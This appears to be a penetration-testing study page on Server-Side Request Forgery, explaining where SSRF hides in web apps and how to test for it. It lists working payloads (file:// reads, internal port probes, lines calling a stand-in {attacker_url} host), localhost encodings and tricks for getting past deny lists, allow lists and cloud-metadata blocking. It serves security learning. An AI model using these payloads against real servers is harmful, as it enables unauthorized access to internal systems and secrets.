# SSRF

**SSRF** stands for **Server-Side Request Forgery**. It's a vulnerability that allows a malicious user to cause the webserver to make an additional or edited HTTP request to the resource of the attacker's choosing.

There are **two types** of SSRF vulnerability; the first is a **regular SSRF** where **data is returned to the attacker's screen**. The second is a **Blind SSRF** vulnerability where an SSRF occurs, but **no information is returned to the attacker's screen**.

## Finding an SSRF

Potential SSRF vulnerabilities can be spotted in web applications in many different ways. Here is an example of four common places to look:

* When a **full URL** is used in a parameter in the address bar:

<figure><img src="../../../../.gitbook/assets/956e1914b116cbc9e564e3bb3d9ab50a.png" alt=""><figcaption></figcaption></figure>

*   A **hidden field** in a form:\


    <figure><img src="../../../../.gitbook/assets/237696fc8e405d25d4fc7bbcc67919f0.png" alt=""><figcaption></figcaption></figure>
*   A **partial URL** such as just the hostname:\


    <figure><img src="../../../../.gitbook/assets/f3c387849e91a4f15a7b59ff7324be75 (1).png" alt=""><figcaption></figcaption></figure>
*   Or **perhaps only the path of the URL**:\


    <figure><img src="../../../../.gitbook/assets/3fd583950617f7a3713a107fcb4cfa49.png" alt=""><figcaption></figcaption></figure>

If working with a blind SSRF where no output is reflected back to you, you'll need to use an external HTTP logging tool to monitor requests such as [https://webhook.site/](https://webhook.site/).



## Testing SSRF

Testers need to find input vectors and fields that could be used for publishing or importing data from a URL (e.g. `GET` and `POST` parameters).

To do this, we have to **navigate through the website** with the **Burp Proxy** activeted, and then we have to analyze the request to **find a possibile vulnerable parameter**.&#x20;

<figure><img src="../../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

With `http://some.website/index.php?url=https://someother.website/index.php`, and `url` being the vulnerable parameter, the following basic payloads can help a tester fetch content of files, scan ports, access filtered resources and so on.

```
file://PATH/TO/FILE
http://127.0.0.1:80/admin
http://127.0.0.1:80
http://127.0.0.1:22
ldap://127.0.0.1:389/%0astats%0aquit
dict://{attacker_url}:11111/
sftp://{attacker_url}:11111/
tftp://{attacker_url}:12346/TESTUDPPACKET
```

To scan for a specific range of private IP addresses (other than `localhost`), Use burp suite intruder that can fetch all of IP addresses in the internal network that is targeted.



## Bypassing Filter

In order to conduct SSRF attacks properly, there may be use cases where filters need to be bypassed

### Blacklist input filter

Some applications block input containing hostnames like `127.0.0.1` and `localhost`, or sensitive URLs like `/admin`. In this situation, you can bypass the filter using various techniques :

* Using an alternative IP representation such as :

```
http://127.1
http://0
http:@0/
http://0.0.0.0:80
http://[::]:80/
http://[0000::1]:80/
http://2130706433 # Decimal version of localhost
http://0x7f000001/ # Hexadecimal version of localhost
```

* Obfuscating string using URL encoded, even double URL encoded sometimes.
* Registered your own domain name that resolved the `localhost` IP address.



## Utils ex.

### \&x= to ignore

If we can insert other domain into a parameter but there is the next part of the URL that we have to ignore we can use  `&x=` at the start of ignore part

```bash
# start URL
https://website.thm/item/2?server=api

# the server par replaces the SUBDOMAIN of the URL. 
# We can add in this par all other URL for the request and then tell to request to 
# ignore the next part with &x= symbol
# Requesto to send
https://website.thm/item/2?server=server.website.thm/flag?id=9&x=

# effective request forgery which will be send 
https://server.website.thm/flag?id=9&x=.website.thm/api/item?id=2
```



## Defeating Common SSRF Defenses

More security-savvy developers aware of the risks of SSRF vulnerabilities may implement checks in their applications to make sure the requested resource meets specific rules. There are usually two approaches to this, either a **deny list** or an **allow list**.

#### Deny List

A Web Application may employ a deny list **to protect sensitive endpoints, IP addresses or domains** from being accessed by the public while still allowing access to other locations. \
A specific endpoint to restrict access is the **localhost**, which may contain server performance data or further sensitive information, so domain names such as `localhost` and `127.0.0.1` would appear on a deny list.\
**Attackers can bypass** a Deny List by using alternative localhost references such as 0, 0.0.0.0, 0000, 127.1, 127.\*.\*.\*, 2130706433, 017700000001 or subdomains that have a DNS record which resolves to the IP Address 127.0.0.1 such as 127.0.0.1.nip.io.

Also, in a **cloud environment**, it would be beneficial to block access to the IP address `169.254.169.254`, which contains metadata for the deployed cloud server, including possibly sensitive information. An **attacker can bypass this** by registering a subdomain on their own domain with a DNS record that points to the IP Address 169.254.169.254.

#### Allow List

An allow list is where all requests get denied unless they appear on a list or match a particular pattern, such as a rule that an URL used in a parameter must begin with **https://website.com.** An **attacker could quickly circumvent this rule** by **creating a subdomain on an attacker's domain name**, such as `https://website.com.attackers-domain.com`. The application logic would now allow this input and let an attacker control the internal HTTP request.



#### Open Redirect

If the above bypasses do not work, there is one more trick up the attacker's sleeve, the open redirect. \
An open redirect is an endpoint on the server where the website visitor gets automatically redirected to another website address. Take, for example, the link `https://website.com/link?url=https://linkedin.com`. This endpoint was created to record the number of times visitors have clicked on this link for advertising/marketing purposes. \
But imagine there was a potential SSRF vulnerability with stringent rules which only allowed URLs beginning with https://website.com/. An attacker could utilise the above feature to redirect the internal HTTP request to a domain of the attacker's choice.



## Resources

{% embed url="https://www.thehacker.recipes/web/inputs/ssrf/" %}
